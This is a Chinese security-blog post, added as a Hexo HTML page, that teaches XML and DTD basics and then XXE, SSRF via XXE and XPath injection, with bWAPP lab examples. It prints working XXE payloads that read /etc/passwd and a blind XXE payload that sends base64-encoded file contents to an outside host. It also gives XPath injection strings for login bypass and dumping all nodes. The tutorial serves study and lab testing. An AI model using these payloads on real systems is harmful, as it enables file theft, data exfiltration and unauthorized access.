@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>XML注入，xxe，xpath | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XML基础众所周知，xml常用于数据存储和传输，文件后缀为 .xml；它是可扩展标记语言（Extensible Markup Language，简称XML），是一种标记语言。XML 被设计为传输和存储数据，其焦点是数据的内容。 1.为什么要使用XML为了便于不用应用、不同平台之间的数据共享和通信。   如 windows 与linux  跨系统交互网站与手机APP信息交互订票软件与支付软件跨平台交">
+<meta name="keywords" content="渗透攻防">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML注入，xxe，xpath">
+<meta property="og:url" content="http://yoursite.com/2018/10/10/xml注入基础/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XML基础众所周知，xml常用于数据存储和传输，文件后缀为 .xml；它是可扩展标记语言（Extensible Markup Language，简称XML），是一种标记语言。XML 被设计为传输和存储数据，其焦点是数据的内容。 1.为什么要使用XML为了便于不用应用、不同平台之间的数据共享和通信。   如 windows 与linux  跨系统交互网站与手机APP信息交互订票软件与支付软件跨平台交">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://thyrsi.com/t6/385/1539172478x-1404775437.png">
+<meta property="og:image" content="http://thyrsi.com/t6/385/1539168731x1822611359.png">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/4a9ONPj37lNwNI*MlgMfPuTF3v67*kvMdfwki.yay84!/b/dAgBAAAAAAAA&bo=xQM9AQAAAAADB9g!&rf=viewer_4">
+<meta property="og:image" content="http://thyrsi.com/t6/385/1539170566x-1566688347.png">
+<meta property="og:image" content="http://thyrsi.com/t6/386/1539251642x-1376440090.png">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/7j3ebAnj8D6e*PtCwuNTCYKfYEL*WCKd0yJlFWHwq6s!/b/dFYBAAAAAAAA&bo=GQYxAQAAAAADBw0!&rf=viewer_4">
+<meta property="og:image" content="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/tXVqFDVM8y31*IqdhLN294id*CXVi.dbWeog71UdTSc!/b/dDUBAAAAAAAA&ek=1&kp=1&pt=0&bo=8ANEAgAAAAADJ7c!&tl=1&vuin=275640346&tm=1540958400&sce=60-2-2&rf=viewer_4">
+<meta property="og:image" content="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/0sJWLRKLXsUydxp6qbGndX8J4qTInG*T51D1NfSHSck!/b/dDABAAAAAAAA&ek=1&kp=1&pt=0&bo=sAMEAQAAAAADF4Q!&tl=1&vuin=275640346&tm=1540958400&sce=60-3-3&rf=viewer_4">
+<meta property="og:image" content="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/Y*m2DvVJENyx01y3LPA*rk23yMZtJMxl6OpIGLVnVrU!/b/dFMBAAAAAAAA&bo=UAIzAgAAAAARF0M!&rf=viewer_4">
+<meta property="og:updated_time" content="2018-11-17T04:40:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XML注入，xxe，xpath">
+<meta name="twitter:description" content="XML基础众所周知，xml常用于数据存储和传输，文件后缀为 .xml；它是可扩展标记语言（Extensible Markup Language，简称XML），是一种标记语言。XML 被设计为传输和存储数据，其焦点是数据的内容。 1.为什么要使用XML为了便于不用应用、不同平台之间的数据共享和通信。   如 windows 与linux  跨系统交互网站与手机APP信息交互订票软件与支付软件跨平台交">
+<meta name="twitter:image" content="http://thyrsi.com/t6/385/1539172478x-1404775437.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-xml注入基础" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/10/10/xml注入基础/" class="article-date">
+  <time datetime="2018-10-09T16:00:00.000Z" itemprop="datePublished">2018-10-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XML注入，xxe，xpath
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><p>众所周知，xml常用于数据存储和传输，文件后缀为 .xml；<br>它是可扩展标记语言（Extensible Markup Language，简称XML），是一种标记语言。<br>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
+<h2 id="1-为什么要使用XML"><a href="#1-为什么要使用XML" class="headerlink" title="1.为什么要使用XML"></a>1.为什么要使用XML</h2><p>为了便于不用应用、不同平台之间的数据共享和通信。  </p>
+<p>如 windows 与linux  跨系统交互<br>网站与手机APP信息交互<br>订票软件与支付软件跨平台交互  </p>
+<h2 id="2-XML代码解析"><a href="#2-XML代码解析" class="headerlink" title="2.XML代码解析"></a>2.XML代码解析</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  
+&lt;note&gt;  
+&lt;to&gt;chybeta&lt;/to&gt;    
+&lt;from&gt;ph0en1x&lt;/from&gt;  
+&lt;/note&gt;  </code></pre><p>在上面代码中的第一行，定义XML的版本与编码。<br>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一  个根元素。如上代码，<note>是整个文档的根元素。嵌套在note标签中的<to>和<from>则是  根的子元素。<br>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。  </from></to></note></p>
+<h2 id="3-语法规则–dtd"><a href="#3-语法规则–dtd" class="headerlink" title="3.语法规则–dtd"></a>3.语法规则–dtd</h2><p>文档类型定义(Document Type Definition)是一套为了进行程序间的数据交换而建立的关于标记符的语法规则。它是标准通用标记语言和 [1]  可扩展标记语言1.0 版规格的一部分，文档可根据某种DTD语法规则验证格式是否符合此规则。文档类型定义也可用做保证标准通用标记语言、可扩展标记语言文档格式的合法性，可 通过比较文档和文档类型定义文件来检查文档是否符合规范，元素和标签使用是否正确。文件实例提供应用程序一个数据交换的格式。使用各类文档类型定义是为了 让标准通用标记语言、可扩展标记语言文件能符合规定的数据交换标准，因为这样，不同的公司只需定义好标准文档类型定义，就都能依文档类型定义建立文档实 例，并且进行验证，如此就可以轻易交换数据，防止了实例数据定义不同等原因造成的数据交换障碍，满足了网络共享和数据交互。文档类型定义文件是一个美国信息交换标准代码文本文件。</p>
+<p>参考资料：<a href="https://blog.csdn.net/yeoman92/article/details/53055749" target="_blank" rel="noopener">https://blog.csdn.net/yeoman92/article/details/53055749</a></p>
+<h2 id="4-实体"><a href="#4-实体" class="headerlink" title="4.实体"></a>4.实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声 明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。<br>实体类型：XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</p>
+<p><img src="http://thyrsi.com/t6/385/1539172478x-1404775437.png" alt></p>
+<h2 id="5-文档类型声明"><a href="#5-文档类型声明" class="headerlink" title="5.文档类型声明"></a>5.文档类型声明</h2><p>文档类型定义可定义合法的XML文档构建模块。<br>它使用一系列合法的元素来定义文档的结构。<br>★它可被成行地声明于 XML 文档中，也可作为一个外部引用。 //漏洞触发点<br>通过它，您的每一个 XML 文件均可携带一个有关其自身格式的描述。<br>通过它，独立的团体可一致地使用某个标准的文档类型定义来交换数据。<br>而您的应用程序也可使用某个标准的文档类型定义来验证从外部接收到的数据。<br>您还可以使用它来验证您自身的数据。</p>
+<h3 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 !DOCTYPE 声明中：<br>&lt;!DOCTYPE根元素 [元素声明]&gt;<br>带有 DTD 的 XML 文档实例  </p>
+<pre><code>&lt;?xmlversion=&quot;1.0&quot;?&gt;    
+&lt;!DOCTYPE note [  
+&lt;!ELEMENT note (to,from,heading,body)&gt;  
+&lt;!ELEMENT to (#PCDATA)&gt;  
+&lt;!ELEMENT from (#PCDATA)&gt;  
+&lt;!ELEMENT heading (#PCDATA)&gt;  
+&lt;!ELEMENT body (#PCDATA)&gt;  
+]&gt;  
+&lt;note&gt;  
+&lt;to&gt;Tove&lt;/to&gt;  
+&lt;from&gt;Jani&lt;/from&gt;  
+&lt;heading&gt;Reminder&lt;/heading&gt;  
+&lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt;  
+&lt;/note&gt;  </code></pre><p>以上 DTD 解释如下：<br>!DOCTYPE note (第二行)定义此文档是 note 类型的文档。<br>!ELEMENT note (第三行)定义 note 元素有四个元素：”to、from、heading,、body”<br>!ELEMENT to (第四行)定义 to 元素为 “#PCDATA” 类型<br>!ELEMENT from (第五行)定义 from 元素为 “#PCDATA” 类型<br>!ELEMENT heading (第六行)定义 heading 元素为 “#PCDATA” 类型<br>!ELEMENT body (第七行)定义 body 元素为 “#PCDATA” 类型  </p>
+<h3 id="外部声明"><a href="#外部声明" class="headerlink" title="外部声明"></a>外部声明</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：<br><!DOCTYPE 根元素 SYSTEM "文件名"><br>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:</p>
+<pre><code>&lt;?xmlversion=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE note SYSTEM&quot;note.dtd&quot;&gt;
+&lt;note&gt;
+&lt;to&gt;Tove&lt;/to&gt;
+&lt;from&gt;Jani&lt;/from&gt;
+&lt;heading&gt;Reminder&lt;/heading&gt;
+&lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt;
+&lt;/note&gt;</code></pre><p>note.dtd 文件：</p>
+<pre><code>&lt;!ELEMENT note (to,from,heading,body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;</code></pre><h1 id="xml漏洞–XXE"><a href="#xml漏洞–XXE" class="headerlink" title="xml漏洞–XXE"></a>xml漏洞–XXE</h1><h2 id="1-漏洞产生的原因"><a href="#1-漏洞产生的原因" class="headerlink" title="1.漏洞产生的原因"></a>1.漏洞产生的原因</h2><p>XML文件的解析依赖libxml库，而libxml2.9以前的版本默认支持并开启了外部实体的引用，服务端解析<br>用户提交的xml文件时未对xml文件 引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，并且实体的URL支持file://和php://等协议，攻击者可以在xml文件中声明 URI指向服务器本地的实体造成攻击。</p>
+<h2 id="2-xxe本地测试有回显读取文件"><a href="#2-xxe本地测试有回显读取文件" class="headerlink" title="2.xxe本地测试有回显读取文件"></a>2.xxe本地测试有回显读取文件</h2><h3 id="windows环境下-测试"><a href="#windows环境下-测试" class="headerlink" title="windows环境下 测试"></a>windows环境下 测试</h3><p>PHP源代码</p>
+<pre><code>&lt;?php
+
+$data = file_get_contents(&apos;php://input&apos;);
+
+$xml = simplexml_load_string($data);
+
+echo $xml-&gt;name;
+?&gt;</code></pre><p>正常用户提交代码</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;user&gt;
+&lt;name&gt;Striker666666666666&lt;/name&gt;
+&lt;wechat&gt;strikersb&lt;/wechat&gt;
+&lt;public_wechat&gt;sec_fe&lt;/public_wechat&gt;
+&lt;/user&gt;</code></pre><p><img src="http://thyrsi.com/t6/385/1539168731x1822611359.png" alt></p>
+<p>恶意代码构造（有回显）</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; //它定义 XML 的版本 (1.0) 和所使用的编码 )。
+&lt;!DOCTYPE a [ &lt;!ENTITY aa SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt;  //引用实体system中的file 读取文件。  
+&lt;user&gt; //根元素说明是用户的信息
+&lt;name&gt;&amp;b;&lt;/name&gt;//名字，源代码中意为输出name标签里的数据，&amp;b 将第二行中的b实体化。然后引用，利用file协议读取C盘下的txt文件
+&lt;wechat&gt;strikersb&lt;/wechat&gt;
+&lt;public_wechat&gt;sec_fe&lt;/public_wechat&gt;
+&lt;website&gt;aaa&lt;/website&gt;
+&lt;/user&gt;</code></pre><p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/4a9ONPj37lNwNI*MlgMfPuTF3v67*kvMdfwki.yay84!/b/dAgBAAAAAAAA&bo=xQM9AQAAAAADB9g!&rf=viewer_4" alt></p>
+<h3 id="linux-本地xml测试"><a href="#linux-本地xml测试" class="headerlink" title="linux 本地xml测试"></a>linux 本地xml测试</h3><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE Anything [
+&lt;!ENTITY entityex SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;name&gt;&amp;entityex;&lt;/name&gt;</code></pre><p>可以读取passwd。</p>
+<p>如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</p>
+<p>本地测试利用的是云服务器，没有回显，未读取成功，linux下未测试成功。- -。</p>
+<p><img src="http://thyrsi.com/t6/385/1539170566x-1566688347.png" alt></p>
+<h2 id="3-本地测试无回显注入读取文件"><a href="#3-本地测试无回显注入读取文件" class="headerlink" title="3.本地测试无回显注入读取文件"></a>3.本地测试无回显注入读取文件</h2><pre><code>&lt;!DOCTYPE a [ 
+&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % dtd SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&gt;
+%dtd;
+%mydata;
+]&gt;
+其中attack.dtd的内容为：
+&lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &quot;http://www.hackersb.cn/?%file&quot;&gt;&quot; //base64加密之后然后带着参数访问，在日志中可以看到 编码之后的文件数据。</code></pre><p><img src="http://thyrsi.com/t6/386/1539251642x-1376440090.png" alt></p>
+<h2 id="xml造成的ssrf注入"><a href="#xml造成的ssrf注入" class="headerlink" title="xml造成的ssrf注入"></a>xml造成的ssrf注入</h2><h3 id="linux-本地ssrf测试"><a href="#linux-本地ssrf测试" class="headerlink" title="linux 本地ssrf测试"></a>linux 本地ssrf测试</h3><p>探测开放端口</p>
+<p>利用nc 可本地测试是否能够连接</p>
+<h3 id="windows-本地ssrf探测内网端口测试"><a href="#windows-本地ssrf探测内网端口测试" class="headerlink" title="windows 本地ssrf探测内网端口测试"></a>windows 本地ssrf探测内网端口测试</h3><?xml version="1.0" encoding="utf-8"?>
+ <!DOCTYPE xxe [<!ELEMENT name ANY >
+<!ENTITY xxe SYSTEM "http://127.0.0.1:80" ><p>]&gt;<br><root><br><name><br>&xxe;<br></name><br></root></p>
+<p>开启报错</p>
+<p>如果端口开放</p>
+<p>则显示正常</p>
+<p>如果端口关闭</p>
+<p>则显示主机拒绝访问</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/7j3ebAnj8D6e*PtCwuNTCYKfYEL*WCKd0yJlFWHwq6s!/b/dFYBAAAAAAAA&bo=GQYxAQAAAAADBw0!&rf=viewer_4" alt></p>
+<h1 id="Xpath注入"><a href="#Xpath注入" class="headerlink" title="Xpath注入"></a>Xpath注入</h1><p>Xpath是类似SQL的一种从XML结构中搜索节点数据的语言（DSL），其注入放手就是构造完整可执行的DSL，本质与SQL注入一样。</p>
+<p>简单理解<br>xpath就是在xml文件里找东西的。<br>可以这么理解，xml就是个类似数据库的东西<br>而xpath实际上就是数据库查询！  </p>
+<h2 id="Xpath定义"><a href="#Xpath定义" class="headerlink" title="Xpath定义"></a>Xpath定义</h2><p>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知 识的情况下，通过XPath查询得到一个XML文档的完整内容。  </p>
+<h2 id="xpath一般的危害为"><a href="#xpath一般的危害为" class="headerlink" title="xpath一般的危害为"></a>xpath一般的危害为</h2><pre><code>越权查看xml数据库信息，
+添加admin账户
+绕过登录以admin身份登录 等</code></pre><h2 id="XPath注入攻击特点"><a href="#XPath注入攻击特点" class="headerlink" title="XPath注入攻击特点"></a>XPath注入攻击特点</h2><p>XPath注入攻击利用两种技术，即XPath扫描和 XPath查询布尔化。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。XPath注入攻击同SQL注入攻击类似，但和SQL注入攻击相比较，XPath在以下方面具有优势。</p>
+<pre><code>（1） 广泛性。XPath注入攻击利用的是XPath语法，由于XPath是一种标准语言，因此只要是利用XPath语法的Web 应用程序如果未对输入的
+XPath查询做严格的处理都会存在XPath注入漏洞，所以可能在所有的XPath实现中都包含有该弱点，这和SQL注入攻击有 很大区别。在SQL注入
+攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。
+
+（2） 危害性大。XPath语言几乎可以引用XML文档的所有部分，而这样的引用一般没有访问控制限制。但在SQL注入攻击中，一个“用户”的权限
+  可能被限制到 某一特定的表、列或者查询，而XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的
+  安全漏洞，即可构造针对 XPath应用的自动攻击。</code></pre><h2 id="xpath基本语法"><a href="#xpath基本语法" class="headerlink" title="xpath基本语法"></a>xpath基本语法</h2><pre><code>表达式    描述
+nodename    选取此节点的所有子节点。
+/    从根节点选取。
+//    从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。
+.    选取当前节点。
+..    选取当前节点的父节点。
+@    选取属性。
+
+路径表达式    结果
+bookstore    选取 bookstore 元素的所有子节点。
+/bookstore    
+
+选取根元素 bookstore。
+
+注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！
+bookstore/book    选取属于 bookstore 的子元素的所有 book 元素。
+//book    选取所有 book 子元素，而不管它们在文档中的位置。
+bookstore//book    选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。
+//@lang    选取名为 lang 的所有属性。
+
+通配符    描述
+*    匹配任何元素节点。
+@*    匹配任何属性节点。
+node()    匹配任何类型的节点。</code></pre><h2 id="Xpath注入攻击原理"><a href="#Xpath注入攻击原理" class="headerlink" title="Xpath注入攻击原理"></a>Xpath注入攻击原理</h2><pre><code> XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath注入攻击的实现原理。
+
+在Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在XML文件中，其原理是通过查找user表中的用户名 （username）和密码（password）的结果来进行授权访问，
+
+&lt;users&gt;
+
+ &lt;user&gt;
+
+     &lt;firstname&gt;Ben&lt;/firstname&gt;
+
+     &lt;lastname&gt;Elmore&lt;/lastname&gt;
+
+     &lt;loginID&gt;abc&lt;/loginID&gt;
+
+     &lt;password&gt;test123&lt;/password&gt;
+
+ &lt;/user&gt;
+
+ &lt;user&gt;
+
+     &lt;firstname&gt;Shlomy&lt;/firstname&gt;
+
+     &lt;lastname&gt;Gantz&lt;/lastname&gt;
+
+     &lt;loginID&gt;xyz&lt;/loginID&gt;
+
+     &lt;password&gt;123test&lt;/password&gt;
+
+ &lt;/user&gt;</code></pre><p>  但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如 loginID = ‘xyz’ 和 password = ‘123test’，则该查询语句将返回 true。但如果用户传入类似 ‘ or 1=1 or ‘’=’ 的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码：</p>
+<p>//users/user[loginID/text()=’’or 1=1 or ‘’=’’ and password/text()=’’ or 1=1 or ‘’=’’]</p>
+<p>这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲入技术获取最高权限帐号和其它重要文档信息。</p>
+<h2 id="bwapp测试"><a href="#bwapp测试" class="headerlink" title="bwapp测试"></a>bwapp测试</h2><p>xpath常用语句 查询所有节点内容<br>Exp:score.php?user=vk’] |  //* | //* [‘<br>重点为：vk’] |  //* | //* [‘<br>一般用 //* 来匹配所有节点。这样一下子查出所有的信息！<br>为什么说xpath更像拼字游戏呢？<br>就在这了，你得完全拼上本来的查询语句，不然就会出错，而且这个还没有注释，不能像sql注入一样，用注释杀掉后面语句</p>
+<p>首先单引号闭合前面，] 也是闭合前面<br>| 这个表示分别执行，有点像union select，这个符号前后的路径都去查询</p>
+<p>//* 前面提到过，匹配所有节点</p>
+<p>|//*[‘  闭合后面</p>
+<h1 id="登陆框"><a href="#登陆框" class="headerlink" title="登陆框"></a>登陆框</h1><p><img src="http://a2.qpic.cn/psb?/V14K5DCn3C6bNV/tXVqFDVM8y31*IqdhLN294id*CXVi.dbWeog71UdTSc!/b/dDUBAAAAAAAA&ek=1&kp=1&pt=0&bo=8ANEAgAAAAADJ7c!&tl=1&vuin=275640346&tm=1540958400&sce=60-2-2&rf=viewer_4" alt></p>
+<p>这个登录界面访问权限是通过xpath去读取xml文件来实现的。<br>换句话说，你输入账号密码，他就把xml文件里的合法账号密码拿出来<br>和你填写的进行比对，如果一致就通过。      </p>
+<p>也可以使用万能密码 登录</p>
+<p>‘or’1’=’1<br>‘or’1’=’1<br>即可登录成功</p>
+<p>#查询</p>
+<p>执行 genre=action’] | //* | //*[‘ &amp;action=search<br><img src="http://a1.qpic.cn/psb?/V14K5DCn3C6bNV/0sJWLRKLXsUydxp6qbGndX8J4qTInG*T51D1NfSHSck!/b/dDABAAAAAAAA&ek=1&kp=1&pt=0&bo=sAMEAQAAAAADF4Q!&tl=1&vuin=275640346&tm=1540958400&sce=60-3-3&rf=viewer_4" alt></p>
+<p>会出现报错</p>
+<p>加括号<br>exp：genre=action’)] | //* | //*[(‘ &amp;action=search</p>
+<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/Y*m2DvVJENyx01y3LPA*rk23yMZtJMxl6OpIGLVnVrU!/b/dFMBAAAAAAAA&bo=UAIzAgAAAAARF0M!&rf=viewer_4" alt></p>
+<p>危害 泄露所有节点的数据。</p>
+<h1 id="XXE-CTF实战"><a href="#XXE-CTF实战" class="headerlink" title="XXE-CTF实战"></a>XXE-CTF实战</h1><p>1.<a href="https://shuaizhupeiqi.github.io/2018/11/16/2018%20%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">EIS-2018ctf挑战赛</a></p>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/10/xml注入基础/" data-id="ck0l0oh9r001kpy2ilwta7jpq" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/10/10/sql注入之参数污染绕waf/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          sql注入之参数污染绕waf
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/09/13/S2-045漏洞脚本cmd/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">S2-045脚本</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
